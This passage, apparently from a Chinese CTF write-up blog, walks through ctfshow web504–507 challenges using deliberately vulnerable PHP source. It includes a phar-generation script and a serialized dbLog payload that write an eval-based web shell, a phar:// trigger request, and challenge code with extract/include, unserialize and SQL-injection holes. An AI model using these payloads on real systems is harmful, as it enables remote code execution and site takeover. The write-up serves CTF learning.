class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;zf.phar&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;zf.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;zf.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223842488.png" alt="image-20220413223842488"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223917170.png" alt="image-20220413223917170"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&amp;pre=phar:<span class="comment">///var/www/html/</span></span><br></pre></td></tr></table></figure><p>记住使用phar:&#x2F;&#x2F;协议哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224734911.png" alt="image-20220413224734911"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224744176.png" alt="image-20220413224744176"></p><h1 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414104704841.png" alt="image-20220414104704841"></p><p>这里也是搜到一个模板php,但是这里读取不了源码了</p><p>我们查看一下抓个包试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105156834.png" alt="image-20220414105156834"></p><p>可以看到这里访问的index.sml文件.我们试试有没有文件遍历</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105404649.png" alt="image-20220414105404649"></p><p>可见查询失败</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105530888.png" alt="image-20220414105530888"></p><p>下载这里也是一样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105605711.png" alt="image-20220414105605711"></p><p>新增模板呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105811237.png" alt="image-20220414105811237"></p><p>上传成功.我们试试.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105901789.png" alt="image-20220414105901789"></p><p>&#x2F;api&#x2F;admin_settings.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复习一个这个文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;;user=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112216286.png" alt="image-20220414112216286"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112259433.png" alt="image-20220414112259433"></p><p>可见已经反序列化了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414113103225.png" alt="image-20220414113103225"></p><h1 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121330746.png" alt="image-20220414121330746"></p><p>这次发现又多了一个文件查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121359533.png" alt="image-20220414121359533"></p><p>发现可以看到源码.我们看下新加的文件</p><p>api&#x2F;admin_file_view.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414122321538.png" alt="image-20220414122321538"></p><p>先传一个文件上去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123323733.png" alt="image-20220414123323733"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123406853.png" alt="image-20220414123406853"></p><h1 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h1><p>api&#x2F;admin_file_view.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>)-<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414124910368.png" alt="image-20220414124910368"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125413444.png" alt="image-20220414125413444"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125540070.png" alt="image-20220414125540070"></p><h1 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h1><p>api&#x2F;admin_file_view.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>)-<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>api&#x2F;admin_templates.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 00:33:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span 